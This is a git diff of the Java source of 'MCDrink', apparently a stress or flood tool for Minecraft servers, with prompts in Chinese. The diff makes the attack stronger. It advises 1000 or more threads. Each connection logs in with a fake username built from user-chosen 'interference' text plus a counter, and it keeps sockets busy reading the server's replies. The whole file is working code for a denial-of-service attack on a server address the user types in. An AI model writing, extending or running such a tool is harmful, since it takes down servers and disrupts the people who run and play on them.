@@ -21,6 +21,8 @@ public class main {
 	public static byte[] pack;
 	public static int version=-1;
 	public static long killT=0;
+	public static long point=0;
+	public static String text="";
 	public static void main(String[] args) {
 		// TODO 自动生成的方法存根
 		System.out.println("欢迎使用MCDrink,作者:Mr.cacti,github:https://github.com/greyCloudTeam/MCDrink,QQ:3102733279");
@@ -28,12 +30,15 @@ public class main {
 		Scanner s=new Scanner(System.in);
 		System.out.print("请输入服务器完整地址(如127.0.0.1:25565):");
 		String ip=s.nextLine();
-		System.out.print("请输入线程数量(建议10,线程越多威力越大,线程过多会死机):");
+		System.out.print("请输入线程数量(看cpu，1000以上效果最好):");
 		String threadNum=s.nextLine();
 		main.part1=ip.split(":");
 		main.port=Integer.parseInt(part1[1]);
 		int num=Integer.parseInt(threadNum);
+		System.out.print("请输入干扰字符，随便几个英文或数字就可以，但是不要太多，不能是中文！:");
+		text=s.nextLine();
 		System.out.println("正在存入缓存");
+		
 		
 		//握手包数据流初始化
 		ByteArrayOutputStream b ;
@@ -67,7 +72,7 @@ public class main {
 		}//先握手
 		
 		System.out.println("正在探测版本..");
-		
+		boolean lock=true;
 		try {
 				Socket s1=new Socket(main.part1[0],main.port);
 				//流准备
@@ -102,11 +107,19 @@ public class main {
 				os.close();
 				s1.close();
 		} catch (Exception e) {
+			lock=false;
 			e.printStackTrace();
 			System.out.print("探测失败，请手动输入协议版本号:");
 			version=Integer.parseInt(s.nextLine());
 		}
-		
+		if(lock) {
+			System.out.print("刚才探测到的是否是真的协议版本号？[y/n]:");
+			String temp=s.nextLine();
+			if((!temp.equals("y"))&&(!temp.equals("Y"))) {
+				System.out.print("请输入正确的协议版本号:");
+				version=Integer.parseInt(s.nextLine());
+			}
+		}
 		try {
 			b= new ByteArrayOutputStream();
 			handshake = new DataOutputStream(b);
@@ -207,7 +220,28 @@ class Thread1 implements Runnable {
 				//第二次握手
 				main.writeVarInt(dos, main.login.length); //prepend size
 				dos.write(main.login); //write handshake packet
+				ByteArrayOutputStream b ;
+				DataOutputStream handshake;
+				b= new ByteArrayOutputStream();
+				handshake = new DataOutputStream(b);
+				handshake.write(0x00);
+				String temp5=main.text+main.point;
+				main.point++;
+				main.writeVarInt(handshake,temp5.length());
+				handshake.writeBytes(temp5);
+				byte[] username=b.toByteArray();
+				main.writeVarInt(dos, username.length); //prepend size
+				dos.write(username); //write handshake packet
 				dos.flush();
+				s.setSoTimeout(1500);
+				while(true) {
+					try {
+					int length=main.readVarInt(di);
+					main.data=main.data+length;
+					byte[] lj=new byte[length];
+					di.readFully(lj);
+					}catch(Exception e) {break;}
+				}
 				//main.data=main.data+main.readVarInt(di);<--老子不要这个数据了
 				di.close();
 				is.close();
